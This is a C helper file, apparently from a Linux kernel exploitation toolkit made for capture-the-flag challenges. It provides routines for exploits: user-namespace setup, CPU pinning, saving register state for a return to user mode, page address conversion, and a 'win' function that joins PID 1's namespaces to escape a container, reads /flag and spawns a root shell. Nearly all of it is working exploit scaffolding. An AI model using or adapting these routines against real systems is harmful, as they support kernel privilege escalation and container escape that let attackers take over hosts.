// https://github.com/qwerty-po/kernel_exploit_modules/helper.c

#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <fcntl.h>
#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>

#include "helper.h"

void panic(char *msg)
{
    perror(msg);
    exit(-1);
}

void print_hex_bytes(uint8_t *buf, int l, int r)
{
    for(int i = l; i < r; i+=0x10)
    {
        for(int j = 0; j < 0x10 && i + j < r; j++)
        {
            printf("%02x ", buf[i+j]);
        }
        printf("\n");
    }
}

void print_hex_8bytes(uint64_t *buf, int l, int r)
{
    for(int i=l; i<r; i++)
    {
        printf("0x%03x: 0x%016lx\n", i, buf[i]);
    }
}

void cpu_affinity(int cpu)
{
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    if (sched_setaffinity(0, sizeof(mask), &mask) < 0)
        perror("sched_setaffinity");
}

void unshare_setup(int flags)
{
	int temp;
	char edit[0x100];

    int uid = getuid(), gid = getgid();

	if(unshare(flags) < 0)
        perror("unshare");

	temp = open("/proc/self/setgroups", O_WRONLY);
	if(write(temp, "deny", strlen("deny")) < 0)
        perror("setgroups");
	close(temp);

	temp = open("/proc/self/uid_map", O_WRONLY);
	snprintf(edit, sizeof(edit), "0 %d 1", uid);
	if(write(temp, edit, strlen(edit)) < 0)
        perror("uid_map");
	close(temp);

	temp = open("/proc/self/gid_map", O_WRONLY);
	snprintf(edit, sizeof(edit), "0 %d 1", gid);
	if(write(temp, edit, strlen(edit)) < 0)
        perror("gid_map");
	close(temp);

	return;
}

void win() {
	if(fork())
	{
		setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
		setns(open("/proc/1/ns/pid", O_RDONLY), 0);
		setns(open("/proc/1/ns/net", O_RDONLY), 0);

		system("cat /flag");

		char *args[] = {"/bin/sh", NULL};
		execve("/bin/sh", args, NULL);
	}
}
void get_shell() {
    printf("[*] try to get root shell\n");
	if (getuid() == 0) {
		win();
	} else {
		puts("[-] failed to get root");
	}
    while(1);
}

struct regs *save_state() {
    struct regs *r = (struct regs *)calloc(1, sizeof(struct regs));
    
    __asm__ __volatile__ (
        ".intel_syntax noprefix;"
        "mov %[cs], cs;"          // Code segment
        "mov %[ss], ss;"          // Stack segment
        "mov %[rsp], rsp;"        // Stack pointer
        "pushf;"                  // Push flags to stack
        "pop %[rflags];"          // Pop into rflags
        ".att_syntax;"
        : [cs] "=r" (r->cs),
          [ss] "=r" (r->ss),
          [rsp] "=r" (r->rsp),
          [rflags] "=r" (r->rflags)
    );

    return r;
}

uint64_t virt2page(uint64_t virt, uint64_t vmalloc_base, uint64_t vmemmap_base) {
	assert((virt & 0xfff) == 0x000);
	return (((virt - vmalloc_base) >> 0xc) << 0x6) + vmemmap_base;
}